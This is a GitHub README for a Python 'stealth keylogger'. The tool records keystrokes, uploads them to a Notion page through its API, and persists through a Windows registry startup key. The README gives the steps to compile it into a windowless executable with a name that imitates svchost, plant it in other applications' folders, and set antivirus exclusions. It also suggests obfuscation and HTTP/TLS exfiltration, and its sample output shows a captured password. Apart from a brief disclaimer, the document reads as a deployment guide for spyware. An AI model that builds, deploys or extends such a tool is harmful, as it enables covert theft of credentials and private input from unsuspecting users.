# 🕵️‍♂️ Stealth Keylogger Project

This repository contains a Python-based **stealth keylogger** that logs displayable characters and uploads them to a **Notion Document** using notion token or secured remote storage and centralized monitoring. It is compiled into an executable (`shchosto.exe`) for stealth deployment and persistence on Windows systems.

---

## 🚀 Features

- ⌨️ Logs all **visible characters** using `pynput`
- ☁️ **Uploads logs** to a specified Notion Document via notion API
- 🔁 **Adds to Windows startup** via Registry key
- 🕶️ Runs **stealthily**, including across system reboots
- 🕵️‍♂️ Runs stealthily even after user shutdown and reopening of the PC due to persistent registry startup
- 🧱 Supports **application-level injection** by dropping `shchosto.exe` into third-party directories

---

## ⚙️ Installation

### 1. Clone the repository

```bash
git clone https://github.com/Hemantabhusal/Stealth_Keylogger.git
cd stealth_keylogger
```

### 2. Install dependencies

```bash
pip install pynput requests pyinstaller
```

### 2. Local Testing

```bash
python keylogger.py
```

### 3. Compile to an executable

```bash
pyinstaller --onefile --noconsole --name=shchosto keylogger.py
```

## 🛑 Stopping the Executable

To stop the keylogger after it's been compiled and is running:
```bash
1. Open Task Manager (Ctrl + Shift + Esc)
2. Go to the "Processes" tab
3. Look for "shchosto.exe"
4. Right-click it and select "End task"

```

---

## 📤 Output Example

The keylogger captures characters and appends them to the configured Notion Document. Example document output might look like:

```text
Hello World
This is a test
9826498836
Azimuthal@999
```

- Each line represents a sequence of keystrokes separated by **Enter** or **Space**.
- The log buffer is cleared **every 5 min** after a successful upload.
  - You can configure this in the code using:  
    ```python
    time.sleep(300)
    ```

---

## 🧠 Usage

- Run the compiled `shchosto.exe` from the `dist/` folder:

```bash
cd dist
./svchost.exe
```

- On execution:
  - Registers for startup using Windows Registry
  - Begins logging and uploading keystrokes to the Notion Document (see `PAGE_ID`)

---

## 🧬 Injection Capability

You may "inject" the keylogger by placing `shchosto.exe` into folders/nested subfolder of legitimate or third-party apps, such as:

```text
C:\Program Files\AppName\
C:\Users\<User>\AppData\Roaming\SomeApp\
```

> Ensure proper execution rights and that antivirus exclusions (if any) are configured.

---

## 🔧 Configuration

Update your **Notion token** and PAGE ID inside `keylogger.py`:


## 📌 Notes

- 🔒 **Admin privileges may required** for registry operations and directory writing
- 🛡️ **Antivirus/Firewall** software may block execution — disable temporarily for testing (with caution)
- 🧪 Do **NOT** use this on systems without **explicit user consent**

---

## ⚠️ Ethical Use Disclaimer

> **⚠️ This tool is for educational, ethical research, or authorized corporate monitoring only. Unauthorized use is illegal and unethical. Misuse can lead to criminal charges.**

---

## 🙋‍♀️ Contributing

Pull requests are welcome for:
- API enhancements
- Better encryption integrations
- Cross-platform support

---

## 🔐 Want More Stealth?

Consider adding:
- 🔇 Key filtering (ignore system keys)
- 🧊 Obfuscated strings
- 🔁 HTTP/TLS data exfiltration
- 🛠️ XOR or AES-based local logging before upload

---

**Use responsibly. Learn deeply. Build ethically.**
